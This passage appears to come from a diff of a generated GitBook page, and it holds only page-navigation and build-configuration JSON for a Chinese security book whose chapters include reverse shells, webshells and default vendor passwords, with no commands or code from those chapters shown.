},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"hack/04-常见端口漏洞.md","mtime":"2020-06-13T07:38:27.589Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-06-16T02:03:04.857Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"08-反弹shell","level":"4.1.8","depth":2,"next":{"title":"10-各厂商登录默认密码","level":"4.1.9","depth":2,"path":"hack/10-各厂商登录默认密码.md","ref":"hack/10-各厂商登录默认密码.md","articles":[]},"previous":{"title":"07-webshell","level":"4.1.7","depth":2,"path":"hack/07-webshell.md","ref":"hack/07-webshell.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["tbfed-pagefooter","expandable-chapters","back-to-top-button","-lunr","livereload"],"pluginsConfig":{"tbfed-pagefooter":{"copyright":"过江龙","modify_label":"该文件修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"livereload":{},"search":{},"lunr":{"maxIndexSize":200000},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"back-to-top-button":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"hack/08-反弹shell.md","mtime":"2020-06-13T07:38:27.589Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-06-16T02:03:04.857Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
